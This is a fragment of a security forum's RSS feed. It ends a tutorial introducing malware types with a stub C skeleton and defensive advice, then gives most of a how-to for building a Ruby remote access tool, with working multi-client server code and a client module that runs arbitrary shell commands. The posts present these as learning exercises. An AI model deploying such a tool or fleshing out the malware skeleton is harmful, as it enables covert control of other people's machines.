<li><strong>Bot/BotNet</strong>. A botnet is a huge number of machines that can be commanded at once to perform some kind of malicious task… Usually a DDoS (Distributed Denial of Service) or send spam. Each machine on the BotNet (usually known as a zombie or Bot) needs to run some software to perform whatever the BotNet is intended for (the DoS attack for instance). This kind of <em>malware</em> also resides in the computer, but its payload is only activated by a remote attacker interactively (actually it can also be scheduled…)</li>
</ul>
<blockquote>
<p><strong>Implementing a RAT is basically the same than implementing Spyware but with interaction. You won’t learn much more, but likely improve your networking programming using unusual communication channels.</strong></p>
</blockquote>
<h1><a name="p-65266-getting-the-malware-executed-14" class="anchor" href="https://d.clarkee.co.uk#p-65266-getting-the-malware-executed-14"></a>Getting the malware executed</h1>
<p>So, writing malware is not that difficult (conceptually speaking), but the real problems are how to get it executed and how to keep it undetected. We had briefly spoke about the detection thing, but we will come back to that in the future. Execution can only happen in two ways:</p>
<ul>
<li>The malware is executed by the user</li>
<li>The malware is executed by the computer (typically other program)</li>
</ul>
<p>This is maybe the trickiest part of the malware life cycle and also the less glamorous as most of the malware gets executed using the first method. That’s is <em>Social Engineering</em> or if you prefer, cheating users. Little to no technical skills required.</p>
<p>Yes, this is the main way to run malware (always has been) and, nowadays people does not even try to build Trojan Horses… A stupid mail with some unknown attachment or a link dropped somewhere will do the trick… Sure, the system will ask for permissions and multiple dialogues will pop-up. And most of the people will still blindly click YES/NEXT/AGREE or whatever text is shown in the button… and voilá… you get some malware executed on a computer. You just need to make the user to badly desire to see what is in that link/app…</p>
<p>Making the computer to run the malware is way more interesting and also way more difficult. This usually requires to exploit some vulnerability in the system that will force it to execute the code the attacker wants. Depending on the type of vulnerability the code may be the whole malware or some kind of dropper, first stage code to get the real thing or something else… but once you have the control of the execution flow, you can run whatever you want (supposing enough privileges have been secured in the process).</p>
<p>Malware using these techniques are much more stealth, specially if they use 0-days to get executed. In those cases, the chances to detect them, if they have been properly coded are very low.</p>
<p>Note that, for some malware as, for instance <em>Worms</em>, this is the only way. In order to copy themselves to other machine and get executed they have to exploit some vulnerability. Try to imagine a worm asking the user to copy and run the binary to a set of machine… I bet that will happen at some point in time :). We had already seen more bizarre things. Anyway, in the coolest case the <em>Worm</em> will use some Remote Code Execution vulnerability and in the simplest it may just exploit a poorly configured telnet service with default password (more likely)…</p>
<p>However, getting it executed, and with enough permissions to carry out the task at hand, is the first step… then the attacker needs to make sure the malware keeps running.</p>
<blockquote>
<p><strong>Implementing this feature will teach you about exploit development, phishing, social engineering.</strong></p>
</blockquote>
<h2><a name="p-65266-persistence-15" class="anchor" href="https://d.clarkee.co.uk#p-65266-persistence-15"></a>Persistence</h2>
<p>The property of a malware to survive updates and reboots of a machine is known as <em>Persistence</em>. Actually, persistence looks for ways to get the application running automatically whenever it dies.</p>
<p>In a sense, these techniques are similar to what we discussed when talking about <em>BackDoors</em>. It takes some effort to get your <em>Malware</em> executed, so you have to take that opportunity to make sure that it will get executed whenever needed so you do not have to exploit the machine again or send a thousand phising mails over and over.</p>
<p>Note that some <em>Malware</em> are one-shot attacks and then persistence is not an issue.</p>
<p>However, persistence is a two-blades sword. On one hand allows the malware to survive reboots, what may be very interesting on some cases. On the other hand in order to survive a reboot, the malware, or part of it, has to be stored somewhere (in the general case), and therefore there will be a sample susceptible of being analysed.</p>
<p>For this reason, whenever possible, malware will try to reside only in memory and do not touch the disk, making harder for the researchers to get a sample and therefore more information on what is happening. Which again, may be useless (getting a sample) depending on the kind of attack the <em>malware</em> is trying.</p>
<p>For instance, a malware, used for a specific task at a specific moment will have an advantage just living in memory. Any mistake dealing with the machine or just restarting it (something that many times is taken as the magic way to solve any computer problem) will just wipe away any track of the malware. You won’t even know if that system was infected or not. Think about protecting your valuables 0-days you do not want anybody else to know about…</p>
<p>On the other hand, think about a massive ransomware campaign… There will be samples all over the place and rebooting a machine will not make any difference in order to get a sample.</p>
<p>Finally note that persistence is highly system dependent and it is more related to system administration skills than programming skills. The same way, sysadmins configure system to run stuff at start-up… is the same the malware has to do. As usual, the details are pretty different in different systems, but the concepts are the same. Programs that get run at start up (services) or every now and ten (crontabs)…</p>
<p>Summing up… sometimes it is a good idea to have persistence, sometimes it doesn’t really matters…</p>
<blockquote>
<p><strong>Implementing this feature will teach you about system administration and somehow privilege escalation.</strong></p>
</blockquote>
<h1><a name="p-65266-cc-16" class="anchor" href="https://d.clarkee.co.uk#p-65266-cc-16"></a>C&amp;C</h1>
<p>Even when C&amp;C are not really part of the <em>malware</em> running on the compromised machines, RAT, Spyware and BotNets requires someone in a remote machine to send data to and accept commands from. The application run by the attacker on the other side is usually known as C&amp;C, C2 or C2C which stands for <em>Command &amp; Control</em>. The name comes likely from the military environment but now is common jargon in the security community.</p>
<p>The C&amp;C application may take different forms and provide different capabilities, depending of the kind of <em>malware</em> it has to interact with. This is not important for us, because C&amp;C are normal applications that do not really need to do any low level stuff to get executed, however, what is relevant for us is the communication channel used by the <em>malware</em> to interact with the C&amp;C application.</p>
<p>Reason is that the infected machine may be in a network properly configured and, therefore, simple communications between both parties won’t be allowed by the network firewall. For that reason <em>malware</em> and C&amp;C applications try to use different communication channels to circumvent network security.</p>
<p>Some examples:</p>
<ul>
<li>HTTP requests from the victim to the attacker machine. This is maybe the simplest (it may not even be HTTP can be a simple TCP connection on the HTTP port) but in its simple form, it clearly exposes the machine running the C&amp;C application</li>
<li>Private Chats over IRC</li>
<li>Twitter DMs</li>
<li>More stealth exfiltration techniques as ICMP or DNS request</li>
<li>Bounced connections from less secure machines in the same network</li>
</ul>
<p>There are many possibilities but for us, what is important, is to know how to implement these types of communication… which is very useful in general and not just for building <em>malwares</em>.</p>
<p>Note the analysis of this traffic is usually a key part of the process to stop a thread and catch who is behind it.</p>
<blockquote>
<p><strong>Implementing this feature will teach you about normal GUI development and advanced networking whenever special communication channels are used.</strong></p>
</blockquote>
<h1><a name="p-65266-our-malware-so-far-17" class="anchor" href="https://d.clarkee.co.uk#p-65266-our-malware-so-far-17"></a>Our malware so far</h1>
<p>So, after this long discussion on what malware is and what is not. What malware does and what doesn’t. We have a pretty general application skeleton to work in and start exploring this world.</p>
<p>It looks like this</p>
<pre data-code-wrap="C"><code class="lang-C">
int init () {
	// Initialisation
	// OPTIONAL: Decrypt code
	// OPTIONAL: Check environment is safe
	// Need Persistance -&gt; Become persistance
	// LOGIC BOMB   -&gt; Check condition or exit
	// TROJAN HORSE -&gt; Start trojan thread
	// 
	return 0;
}

int payload (char *id) {
   // VIRUS            -&gt; Inject itself + Patch
   // WORM             -&gt; Copy itself to remote machine
   // RANSOMWARE       -&gt; Encrypt file
   // SPYWARE          -&gt; Exfiltrate data using secure channel
   // RAT/BOT/Backdoor -&gt; Read comand send response using secure channel
   return 0; 
}
int select_target (int (*f)(char*)) {
   // VIRUS      -&gt; Find non-infected binaries
   // WORM       -&gt; Find suitable reacheables machines
   // RANSOMWARE -&gt; Find data files in disk
   // SPYWARE    -&gt; Find private content in disk
   // RAT        -&gt; Actually do nothing
   f (target);
   return 1 ;// Return 0 for more or 1 go to end
}

int main () {
	init ();
	while (select_target (payload));
}
</code></pre>
<p>I had changed the way we invoke the <code>payload</code> function and just passed the function as a callback to the <code>select_target</code>. It looks cooler this way, but maybe we may need to change this in the future.</p>
<p>The key point here is that, as you can see, with a very simple skeleton we can start coding most of the types of malware we can found nowadays out there. Also note that our selection of functions allows us to combine different malware capabilities at will. This way we can build a ransomware logic bomb, or a trojan worm…</p>
<p>Let’s prepare the code a bit more for the next round:</p>
<pre data-code-wrap="C"><code class="lang-C">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;

int cnt = 0;
#ifdef HAVE_CRYPTER 
int mwf_decrypt_code () { puts ("Decrypt code");}
#endif

#ifdef NEEDS_PERSISTANCE
int mwf_go_persistant () { puts ("Going Persistant");}
#endif

#ifdef IS_LOGIC_BOMB
int mwf_check_run_condition () {puts ("Logic Bomb: Check run condition");return 0;}
#endif

#ifdef IS_TROJAN
int mwf_start_disguise_thread () { puts ("Trojan: Disgussing");}
#endif

#ifdef IS_VIRUS
int mwf_payload (char *id) { printf ("VIRUS: Doing Virus stuff in %s\n", id);}
int mwf_select_target (char *id) {
  sprintf (id, "target-%03d.bin", cnt++);
  puts ("VIRUS: Selecting Target");
}
#endif

#ifdef IS_WORM
int mwf_payload (char *id) { printf ("WORM: Doing worm stuff in %s\n", id);}
int mwf_select_target (char *id) {
    sprintf (id, "target-%03d.host", cnt++);
    printf ("WORM: Selecting Target. Please  copy and run the worm in %s\n",target);
}
#endif

#ifdef IS_RANSOMWARE
int mwf_payload (char *id) { printf ("RANSOM: Crypting file %s\n", id);}
int mwf_select_target (char *id) {
    sprintf (id, "target-%03d.data", cnt++);
    puts ("RANSOM: Selecting Target");
}
#endif

#ifdef IS_SPYWARE
int mwf_payload (char *id) { puts ("SPYWARE: Waiting for command to send info");}
int mwf_select_target (char *id) {puts ("SPYWARE: Finding new data, keyloging,...");}
#endif

#ifdef IS_RAT
int mwf_payload (char *id) { printf ("RAT: Running command %s", id);}
int mwf_select_target (char *id) {printf("%s", "RAT: Waiting for command,... $ ");fgets (id, 1024, stdin);}
#endif


int mwf_check_env () { puts ("Checking environment");}

int init () {
	// Initialisation
  puts ("Generic Initialisation");
  mwf_check_env (); // OPTIONAL: Check environment is safe
#ifdef HAVE_CRYPTER
  mwf_decrypt_code (); // OPTIONAL: Decrypt code
#endif

#ifdef NEEDS_PERSISTANCE	
  mwf_go_persistant (); // Need Persistance -&gt; Become persistance
#endif
#ifdef IS_LOGIC_BOMB
  if (mwf_check_run_condition ()) exit (0); // LOGIC BOMB   -&gt; Check condition or exit
#endif
#ifdef IS_TROJAN
   mwf_start_disguise_thread() 	// TROJAN HORSE -&gt; Start trojan thread
#endif  
	// 
	return 0;
}

int payload (char *id) {
  mwf_payload (id);

   return 0; 
}
int select_target (int (*f)(char*)) {
  char target[1024];
  mwf_select_target (target);
  
  // Infection rate to be managed here
  f (target);
  sleep (1);  
  return 1 ;  // Return 0 for more or 1 go to end
}

int main () {
	init ();
	while (select_target (payload));
}

</code></pre>
<p>Now, we can compile our malware like this:</p>
<pre><code>$ gcc -DHAVE_CRYPTER -DIS_VIRUS -o mw mwf.c
$ ./mwf
Generic Initialisation
Checking environment
Decrypt code
VIRUS: Selecting Target
VIRUS: Doing Virus stuff in target-000.bin
VIRUS: Selecting Target
VIRUS: Doing Virus stuff in target-001.bin
</code></pre>
<p>Or like this</p>
<pre><code>$ gcc -DIS_RAT -DNEEDS_PERSISTENCE -DHAVE_CRYPTER -o mwf mwf.c
$ ./mwf
Generic Initialisation
Checking environment
Decrypt code
Going Persistant
RAT: Waiting for command,... $ ls
RAT: Running command ls
RAT: Waiting for command,... $ ^C
</code></pre>
<p>That’s it for now. We have a generic hollow program that will allow us to explore different kinds of malware. We will be filling the holes in next installments… Or you can just get started right now!</p>
<h1><a name="p-65266-how-to-deal-with-malware-18" class="anchor" href="https://d.clarkee.co.uk#p-65266-how-to-deal-with-malware-18"></a>How to deal with malware?</h1>
<p>I will just include this section here because, this is universal and it works for all malware out there. The rules you have to follow to keep malwares away are:</p>
<ul>
<li><strong>Rule 1</strong>. Only run trustworthy SW. Anything coming from a suspicios website, a spooky mail, etc… Just don’t run it. And  if you have to run them</li>
<li><strong>Rule 2</strong>. If you have to run un-trustworthy SW, run it as an unprivileged user and if possible in a VM/Container without network configured</li>
<li><strong>Rule 2.5</strong>. To help ensuring rules 1 and 2 installing some antivirus SW will help and save you some trouble.</li>
<li><strong>Rule 3</strong>. Keep your system updated. Specially for GNU/Linux, security patches are provided for most distributions in hours whenever an security alarm hits Internet. Just <code>apt upgrade</code> everyday</li>
<li><strong>Rule 4</strong>. Configure your firewall to make harder connections to your system and home calls.</li>
<li><strong>Rule 5</strong>. Have a proper and consistent backup policy.</li>
</ul>
<p>Rule 5 is key and it is the very last resistant line against malware. There is always a chance than a sophisticated malware using a 0-day or a recent bug that has not been patched yet, hits your system and gets it infected, abducted or whatever the malware does. When everything else fails, and that can happen, then the solution is to re-install your system from scratch and restore your data from your backup.</p>
<p>Having a policy for backups is important. The malware can made it to the backup (specially the most stealthy ones) so you need to have a way to identify backups and match them, at least with timestamps so you can recover as much data as possible. If the malware made it into the backup (think about a MS-Office Macro Virus embedded on a documnet, for instance), you may need to restore data from older backup and lose some data… That’s life</p>
<p>Following this 5.5 rules will keep you safe from most malware attacks out there, independently of the type of malware we are talking about. Most of the malwares rely on the laziness of the users to follow the rules above.</p>
<h1><a name="p-65266-conclusion-19" class="anchor" href="https://d.clarkee.co.uk#p-65266-conclusion-19"></a>Conclusion</h1>
<p>We have go through the main types of <em>malware</em> known nowadays and analysed their main features. Based on that we have come up with a void skeleton that will allow us to build all kind of malware just implementing some generic functions and combining them in different ways. We have also mapped most features to a set of skills/knowledge that you can start working on according to your personal interest. And we have seen that those skills are not related at all to security… they are system programming/administration skills.</p>
<p>Note that what we have come up with is the general idea. Things do not have to be in that specific order but to get started, having some structure may be helpful in the learning process.</p>
<p>Finally, this is a very broad topic and I may have forgot something relevant or make some mistakes (I’m not really an expert on this), so be free, specially all the experts on the topic in this community, to provide your feedback, comments, corrections, additions,…Looking forward to your contributions.</p>
<p>In the next installments we will begin exploring the implementation of these functions and we will start getting malware everywhere… hahahaha</p>
            <p><small>4 posts - 4 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/programming-for-wannabes-part-vi-malware-introduction/25595">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/programming-for-wannabes-part-vi-malware-introduction/25595</link>
          <pubDate>Sat, 10 Apr 2021 08:48:25 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-25595</guid>
          <source url="https://d.clarkee.co.uk/t/programming-for-wannabes-part-vi-malware-introduction/25595.rss">Programming for Wannabes Part VI. Malware Introduction</source>
        </item>
        <item>
          <title>How-to Build Your Own Ruby RAT</title>
          <dc:creator><![CDATA[chr0]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <p>Hi everyone!</p>
<p>Building your own RAT is a fun way to practice programming and learn a few things about networking. This how-to covers building a Ruby LAN Remote Administration Tool for Linux.</p>
<p>This post is aimed at beginner/intermediate programmers who want to build their own custom RAT quickly. For this reason the RAT won’t have all the bells and whistles like AES encryption, auto-install, etc.</p>
<p>I encourage anyone who follows the how-to to customize their RAT as much as possible - add your own methods, commands, names and whatever extra functionality you can think of.</p>
<p>Code available at: <a href="https://github.com/chr0x6d/ryat" rel="noopener nofollow ugc">https://github.com/chr0x6d/ryat</a></p>
<h4>Features</h4>
<ul>
<li>
<p>Persistent clients - error handling to keep clients up and running, clients will stay up if the server goes down.</p>
</li>
<li>
<p>Multi-client - server is designed for managing multiple clients.</p>
</li>
<li>
<p>TCP Socket Communication - to enable Internet communication port-forwarding is an option but that will not be covered here. LAN works without port-forwarding.</p>
</li>
<li>
<p>Easy addition of custom commands and methods</p>
</li>
</ul>
<h4>Requirements</h4>
<ul>
<li>Basic Ruby and OOP knowledge</li>
<li>Preferably use Ruby 3.0.0</li>
<li><code>gem install colorize</code></li>
</ul>
<h4>Setup</h4>
<p>Straightforward structure, <code>server.rb</code> is a standalone script.<br>
<code>client.rb</code> requires <code>helpers.rb</code>, we will see how this works later.</p>
<pre><code class="lang-auto">├── client
│   ├── client.rb
│   └── helpers.rb
└── server.rb
</code></pre>
<hr>
<h3>The Server</h3>
<p>The bulk of our code will be in <code>server.rb</code>. When we’re finished writing it we will have a capable server with utilities for handling clients. Lets get started building.</p>
<pre><code class="lang-auto">#!/usr/bin/env ruby

require 'socket' # TCP networking
require 'colorize' # Provides nice terminal colors
</code></pre>
<h4>Client Class</h4>
<p>Our <code>server.rb</code> script will contain 2 classes - Server and Client. Server is the primary object which will use Client objects to store each connected client.</p>
<p>We can now define the Client class. We’ll see how it works when we put it to use in the Server class.</p>
<pre><code class="lang-auto">class Client
  attr_accessor :connection, :addr, :uid

  def initialize(connection, addr, uid)
    @connection = connection
    @addr = addr
    @uid = uid
  end

  # by defining to_s(to_string) we simplify printing Client info
  # print Client.new =&gt; "ID: 1 IP: 192.168.1.2"
  def to_s
    "ID: #{@uid.to_s} IP: #{@addr.to_s}".green
  end
end
</code></pre>
<h4>Server Class</h4>
<p>The Server class is large, containing our server initialization, client acceptance loop and many useful utility methods that will help us manage clients.</p>
<h5>Server Class Initialize</h5>
<p>Our Server class takes <code>port</code> as an argument, starts the server and initializes various instance variables we will use to keep track of clients.</p>
<pre><code class="lang-auto">class Server
  attr_accessor :client_count, :current_client

  def initialize(port)
    @client_count = 0
    @current_client = nil
    @clients = {}

    @server = TCPServer.new(port)
    @server.setsockopt(Socket::SOL_SOCKET, Socket::SO_REUSEADDR, true)
  end
</code></pre>
<p>By default after TCPServer.new(port) a TIME_WAIT of 30-120s starts, preventing us from reusing that port. Setting SO_REUSEADDR to true is not necessary but allows us quick restarts by removing TIME_WAIT.</p>
<h5>Server Class Run</h5>
<p>Now we’ll define the core method of the Server class, <code>run</code>, which will contain a never-ending loop to listen for client connections. In Ruby <code>loop do...end</code> is equivalent to <code>while true do..end</code>.</p>
<p>Inside the loop we’ll have a <code>begin...rescue Exception...end</code>, this is an error handling block that will be a common practice throughout the RAT. Without error handling a single invalid client connection could crash our server. Instead of letting our server terminate, we <code>rescue</code> the Exception, print it and move on.</p>
<pre><code class="lang-auto">  def run
    loop do
      begin
        connection = @server.accept
        client_id = @client_count + 1

        client = Client.new(
          connection,
          connection.peeraddr[3],
          client_id
        )
        puts "\nNew connection =&gt; #{client}".green

        # Add our new client to @clients hash
        @clients[client_id] = client

        @client_count += 1
      rescue Exception =&gt; e
        puts e.backtrace.red
      end
    end
  end
</code></pre>
<p>When a client connects, <code>@server.accept</code> returns a socket built-in object <code>TCPSocket</code> to <code>connection</code>. We now have access to clients connection information with the array <code>connection.peeraddr</code> =&gt; [domain, port, name, IP], we only require the IP address so we use connection.peeraddr[3].</p>
<p>Our Client class takes 3 parameters =&gt; (TCPSocket, IP, UID)<br>
After passing <code>connection</code> and <code>connection.peeraddr[3]</code> we then pass the UID.</p>
<p><code>@client_count</code> increases or decreases by 1 as Clients are added/removed. We use this to assign a unique identifier(UID) to each Client object.</p>
<p><code>@clients</code> is a hash(often called a dictionary in other languages). The keys are UID’s and the values Client objects. We will use the <code>@clients</code> hash often to access all or individual Clients.</p>
<h5>Server Class Utilities</h5>
<p>The following methods add general functionality to our server. We need to be able to select a specific client, remove clients, check if clients are active etc.</p>
<p>We could have 5 clients connected for example, and we want to send a command to client ID 3 only. For this purpose we need to be able to <code>select_client(id)</code> and <code>unselect</code> by changing <code>@current_client</code>.</p>
<p>In <code>select_client</code> we see a common Ruby logic style called guard clauses, instead of wrapping code in an <code>if do...end</code> block we use an <em>if modifier</em> and raise/return.</p>
<pre><code class="lang-auto">  def select_client(id)
    begin
      @current_client = @clients[id]

      # Ruby-Style guard clause
      raise NoMethodError if @current_client.nil?

      puts "Client #{id} selected".green
    rescue NoMethodError =&gt; e
      puts "Invalid id: #{id}\nEnter 'clients' to see available clients".red
    end
  end

  def unselect
    @current_client = nil
  end
</code></pre>
<p>We can now define a couple simple helper methods for iterating through clients. <code>get_clients</code> returns an array of Client objects from the <code>@clients</code> hash.</p>
<p><code>list_clients</code> prints each clients ID/IP, the <code>Client to_s</code> method is automatically used, as Ruby’s puts/print calls <code>to_s</code> on every object passed to it.</p>
<pre><code class="lang-auto">  def get_clients
    cli = []
    @clients.each_value { |c| cli &lt;&lt; c }
    cli
  end

  def list_clients
    # Another guard clause
    return 'No clients available'.red if @clients.empty?
    get_clients.each { |client| puts client }
  end
</code></pre>
<p>Sending and Receiving from TCP sockets is an error-ridden practice. It can take time for a port to close - up to 2 minutes as we’ve seen from TIME_WAIT, without any indicator that it is down.</p>
<p>Sending commands to a client that is down can result in a <code>Broken Pipe</code> error, as the packets are never received. Attempting to receive from a client that is down could cause our program to hang - much like having a <code>$stdin.gets</code> and never entering any user input.</p>
<p>Clients inevitably will go down for any number of reasons - system shutdown, network issues etc. When this happens we don’t want one client to crash the entire server because it refuses to read a command, so as before we use <code>begin...Rescue Exception...end</code> blocks.</p>
<pre><code class="lang-auto">  def send_client(msg, client)
    begin
      client.connection.write(msg)
    rescue Exception =&gt; e
      puts e.backtrace.red
    end
  end

  def recv_client(client)
    begin
      len = client.connection.gets # How many bytes are sent from client to us
      client.connection.read(len.to_i) # If there are bytes to read, return them as text
    rescue Exception =&gt; e
      puts e.backtrace.red
    end
  end
</code></pre>
<p>As well as accepting clients, we need to be able to remove them. For this we’ll define <code>destroy_client(id)</code>. This allows the server admin to specify a client’s UID and it will be shutdown client-side and removed from the server.</p>
<p>When removing a client server-side, all we need is <code>@clients.delete(id)</code>, removing that client from our <code>@clients</code> hash. Our clients will be persistent though, they don’t care if the server is up/down, and will continue running.</p>
<p>To <em>really</em> stop a client, we send it a specific command, <code>send_client('destroy', client)</code> in this case. When the client receives <code>'destroy'</code> it will stop, we’ll see this in action when we’re implementing the client.</p>
<pre><code class="lang-auto">  def destroy_client(id)
    begin
      client = @clients[id]
      raise NoMethodError if client.nil?

      # If the client we're removing is currently selected, unselect it
      # We must check @current_client exists before unselecting
      if @current_client
        unselect if @current_client.uid == id
      end

      send_client('destroy', client)
      @clients.delete(id)
      @client_count -= 1
      puts "Client #{id} destroyed".yellow
    rescue NoMethodError =&gt; e
      puts "Invalid id: #{id}\nEnter 'clients' to see available clients".red
    end
  end
</code></pre>
<p>Imagine if we had 20 clients connected, and 10 of them were no longer responding to commands. We could go through and <code>destroy_client(id)</code> each client, but thats tedious.</p>
<p>As we’ve seen, sockets can’t tell us if they’re alive or not, the only way to tell is to send bytes over the wire and check the response. Thats exactly what the <code>heartbeat</code> method will do, named after so-called <a href="https://en.wikipedia.org/wiki/Heartbeat_(computing)" rel="noopener nofollow ugc">heartbeat pings</a>.</p>
<p>In our client implementation, we will anticipate the <code>'heartbeat'</code> message and respond with <code>'alive'</code>. If a client is unable to respond correctly then we know it is down, and we call <code>destroy_client(id)</code> on it.</p>
<pre><code class="lang-auto">  def heartbeat
    # Check if clients are still alive and responding, remove otherwise
    get_clients.each do |temp_client|
      send_client('heartbeat', temp_client)
      beat = recv_client(temp_client)
      destroy_client(temp_client.uid) if beat != 'alive'
    end
    puts "Heartbeat Finished - All non-responding clients removed.".green
  end
</code></pre>
<p>Sometimes we’ll want to shut our server down, but keep the clients running, so that we can start the server later and the clients will be waiting to reconnect. This will be the <code>quit</code> method.</p>
<p>Or we’ll want to shut it all down - send <code>'destroy'</code> to every client and then close the server. For this we’ll define <code>hardexit</code>.</p>
<pre><code class="lang-auto">  def quit
    print "Exit server but keep clients active? [y/n]: "
    inp = $stdin.gets.chomp.downcase
    exit 0 if inp == 'yes' || inp == 'y'
  end

  def hardexit
    print "Exit server and destroy all clients? [y/n]: "
    inp = $stdin.gets.chomp.downcase
    if inp == 'yes' || inp == 'y'
      get_clients.each { |client| send_client('destroy', client) }
      exit 0
    end
  end
end
</code></pre>
<p>Thats our Server class finished! If you’re feeling ambitious, add a few custom methods to Server that improves upon it. An example would be a <code>broadcast(cmd)</code> that sends <code>cmd</code> to every client in <code>@clients</code>.</p>
<hr>
<h3>Using the Server</h3>
<p>We will finish <code>server.rb</code> with 3 final methods(not in Server class). <code>help</code> for printing available commands, <code>get_input</code> for getting input from the server admin and <code>start</code> which will launch our server and wait for input.</p>
<p>In <code>start</code> we will define arrays of client-specific and server commands. They will be passed to <code>help</code> so that the admin can view them.</p>
<pre><code class="lang-auto">def help(server_cmds, client_cmds)
  puts "Server Commands:".green
  server_cmds.each { |gen| puts "- #{gen}" }
  puts "\nClient Commands:".green
  client_cmds.each { |cli| puts "- #{cli}" }
end
</code></pre>
<p><code>get_input</code> is very simple, by using a default parameter <code>prompt</code> we’ll have a base prompt for our RAT. <code>$stdin.gets.chomp</code> will wait for terminal text input and return it.</p>
<pre><code class="lang-auto">def get_input(prompt = 'ryat&gt;')
  print "#{prompt} "
  $stdin.gets.chomp
end
</code></pre>
<p>Now for our final method in <code>server.rb</code>, <code>start</code> will launch a new Server, deal with admin input and print data from clients.</p>
<p>We assign a port from terminal arguments, <code>./server.rb 4000</code> if its passed, otherwise we give it a default value with <code>port ||= 3200</code>. The <code>server.run</code> method is placed in a Thread, so that it can run in parallel with <code>start</code>.</p>
<p>We define our arrays of commands - <code>client_cmds</code> will only work when <code>@current_client</code> is set. <code>server_cmds</code> will be available for use at all times.</p>
<pre><code class="lang-auto">def start
  port = ARGV[0]
  port ||= 3200

  client = nil
  data = nil
  history = []
  server = Server.new(port)

  Thread.new { server.run }
  puts "Sever started on port #{port}".green

  client_cmds = %w[
    exe ls pwd pid ifconfig system
  ]

  server_cmds = %w[
    help select unselect clients heartbeat history destroy hardexit exit
  ]
</code></pre>
<p>Now we’re ready to parse admin input. The remaining code in <code>start</code> will be contained in a <code>loop do...end</code> for interactivity.</p>
<p>First we use our <code>get_input</code> method, and ensure we pass <code>server.current_client.uid</code> to the prompt if a client is selected, otherwise the prompt will default to <code>'ryat&gt; '</code>.</p>
<p><code>next</code> is the Ruby equivalent to <code>continue</code> in other languages, the execution will jump back to the start of the <code>loop do...end</code> if <code>input.nil?</code>. We also store commands made in <code>history</code> array similarly to <code>cat ~/.bash_history</code>.</p>
<pre><code class="lang-auto">  loop do
    if server.current_client.nil?
      input = get_input
    else
      input = get_input("ryat (Client #{server.current_client.uid})&gt; ")
    end

    next if input.nil?
    history.push(input)
    cmd, action = input.split(' ')

    if client_cmds.include?(input) &amp;&amp; server.current_client.nil?
      puts "Client specific command used".red
      puts "Select a client first (#{server.client_count} available)".red
      next
    end
</code></pre>
<p>Now we must act upon the admin’s input. As we’re comparing against string literals, we’ll use a large <code>case...end</code>, Ruby’s equivalent to <code>switch</code>. Note that in a <code>case...end</code> it is Ruby style not to indent the <code>when</code> because a <code>case...end</code> doesn’t create a new scope.</p>
<p>First we’ll add the server commands, most of which will call a method from our <code>server</code> object.</p>
<pre><code class="lang-auto">    case cmd
    # Server Commands
    when 'help'
      help(server_cmds, client_cmds)
    when 'select'
      server.select_client(action.to_i)
    when 'unselect'
      server.unselect
    when 'clients'
      server.list_clients
    when 'heartbeat'
      server.heartbeat
    when 'hardexit'
      server.hardexit
    when 'history'
      history.each_with_index { |cmd, i| puts "#{i}: #{cmd}"}
    when 'destroy'
      server.destroy_client(action.to_i)
    when 'exit'
      server.quit
      next # Only reached if the admin doesn't confirm exit
    when 'hardexit'
      server.hardexit
      next
</code></pre>
<p>Continuing on in the same <code>case...end</code> we add the client commands. Most commands such as <code>ls</code>, <code>pwd</code> and <code>pid</code> are added to a single <code>when</code> as we can send them directly as <code>cmd</code>.</p>
<p>The <code>exe</code> command is special though, as we want to send the entire input. This allows us to send long bash commands to the client like <code>exe wget -r --tries=10 www.google.com</code>.</p>
<p>If we get <code>data</code> back from a command, we’ll then print it with <code>puts data unless data.nil?</code>. Then reset <code>data</code> back to nil so it doesn’t interfere with the next command. Finally we call <code>start()</code>, setting our server in motion.</p>
<pre><code class="lang-auto">    # Client Commands
    when 'exe'
      next if action.nil?
      server.send_client(input, server.current_client)
      data = server.recv_client(server.current_client)
    when 'ls', 'pwd', 'pid', 'ifconfig', 'system'
      server.send_client(cmd, server.current_client)
      data = server.recv_client(server.current_client)
    else
      puts "Unknown command: #{input}. Enter 'help' for available commands.".red
    end
    puts data unless data.nil?
    data = nil
  end
end

start()
</code></pre>
<p>We’ve finished <code>server.rb</code>, try it out with <code>./server.rb 4000</code> and you should be greeted with a friendly <code>Server has started on port 4000</code> and a prompt. If you get a Socket error, try running the server on a different port.</p>
<p>Maybe put your own spin on the server, complete with ASCII art and custom commands <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<hr>
<h3>The Client</h3>
<p>If you’ve made it this far, great, the hard part is over. The client is far shorter than the server. The client has 2 jobs - execute commands and stay running no matter what.</p>
<h4>helpers.rb</h4>
<p>The client will be composed of 2 scripts, <code>helpers.rb</code> and <code>client.rb</code>. We’ll write <code>helpers.rb</code> first, it will contain a short module that we will use in <code>client.rb</code>.</p>
<pre><code class="lang-auto">require 'socket'
require 'etc'

module Helpers
  def self.exe(cmd)
    # `` executes bash command in Ruby
    `#{cmd}`
  end

  def self.ls
    `ls`
  end

  def self.pwd
    Dir.pwd
  end

  def self.pid
    Process.pid
  end

  def self.ifconfig
    # With || 'ip a' will run if 'ifconfig' is not installed
    `ifconfig || ip a`
  end

  def self.system
    result = "OS: " + RUBY_PLATFORM + "\n"
    result += "Architecture: " + `uname -m`
    result += "Hostname: " + Socket.gethostname + "\n"
    result += "User: " + Etc.getlogin
  end
end
</code></pre>
<p>Here is where Ruby really shines as a scripting language - we don’t mess around with <code>system()</code> or <code>popen()</code> functions like in other languages. Anything we want executed as a bash command is placed in-between `` backticks.</p>
<p>In this version the <code>self.pwd</code> method uses <code>Dir.pwd</code>, a Ruby built-in for finding the present working directory. See if you can use a `` bash command to recreate it.</p>
<p><code>require 'etc'</code> gives us access to the Ruby built-in module for accessing information generally stored in the /etc directory. In this version we grab the current logged in user with <code>Etc.getlogin</code>. Other information like <code>Etc.passwd</code> to get the hashed password is available too. The <a href="https://ruby-doc.org/stdlib-2.5.3/libdoc/etc/rdoc/Etc.html" rel="noopener nofollow ugc">Etc Documentation</a> could be useful to you.</p>
<h4>client.rb</h4>
<p>We need the client to have solid error handling to avoid crashes, and to be ready to receive and execute commands.</p>
